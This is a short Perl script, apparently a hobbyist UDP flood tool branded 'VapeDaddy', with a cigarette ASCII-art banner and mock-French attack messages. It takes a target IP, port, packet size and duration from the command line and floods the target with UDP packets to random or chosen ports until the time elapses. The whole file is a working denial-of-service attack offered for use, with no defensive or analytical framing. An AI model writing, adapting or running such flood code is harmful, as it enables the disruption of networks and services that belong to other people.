#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

##
# VapeDaddy 
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
use Term::ANSIColor;
print color 'cyan';
print BOLD CYAN<<EOTEXT;
                           
Cigarette.....
Thanks Google 
                                                                                    

L’habit ne fait pas le moine
                
CREATED BY SMILEWARE
 
 a,  8a
 `8, `8)                            ,adPPRg,
  8)  ]8                        ,ad888888888b
 ,8' ,8'                    ,gPPR888888888888
,8' ,8'                 ,ad8""   `Y888888888P
8)  8)              ,ad8""        (8888888""
8,  8,          ,ad8""            d888""
`8, `8,     ,ad8""            ,ad8""
 `8, `" ,ad8""            ,ad8""
    ,gPPR8b           ,ad8""
   dP:::::Yb      ,ad8""
   8):::::(8  ,ad8""
   Yb:;;;:d888""  Veliuxed {esthedium}
    "8ggg8P"      Cigarette Lighted
   
EOTEXT

print "Commencer l'attaque vers $ip " . ($port ? $port : "fumer la culpabilité") . "avec des vapeurs toxiques " . 
  ($size ? "$size-tué" : "quarante cinq") . "lambeaux de nicotine" . 
  ($time ? " for $time seconds" : "") . "\n";
print "Avorter the attack with ctrl+c" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}